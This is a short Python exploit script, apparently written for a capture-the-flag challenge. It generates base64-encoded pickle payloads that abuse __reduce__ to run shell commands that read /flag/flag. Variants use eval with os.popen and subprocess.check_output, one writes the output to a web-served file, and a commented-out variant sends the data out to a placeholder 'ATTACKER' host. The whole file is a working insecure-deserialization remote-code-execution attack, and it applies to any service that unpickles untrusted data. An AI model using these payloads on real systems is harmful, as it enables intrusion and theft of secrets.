#!/usr/bin/env python3
import pickle, base64, subprocess

# ── Payload 1: eval + os.popen → returns flag as str (best display) ──
class P1:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('cat /flag/flag').read()",))

# ── Payload 2: subprocess.check_output → returns bytes ──
class P2:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag/flag'],))

# ── Payload 3: eval + glob (in case /flag is --x--x--x like the last app) ──
class P3:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('cat /flag/*').read()",))

# ── Payload 4: write to /app then fetch via web (if output isn't shown) ──
class P4:
    def __reduce__(self):
        return (eval, ("open('/app/leak.txt','w').write(__import__('os').popen('cat /flag/flag').read())",))

# ── Payload 5: OOB (if both output and /app write are blind) ──
# class P5:
#     def __reduce__(self):
#         return (eval, ("__import__('urllib.request').request.urlopen('http://ATTACKER/?x='+__import__('os').popen('cat /flag/flag').read())",))

for i, cls in enumerate([P1, P2, P3, P4], 1):
    data = pickle.dumps(cls(), protocol=2)      # protocol 2 = broad compat
    print(f"=== Payload {i} ===")
    print(base64.b64encode(data).decode())
    print()
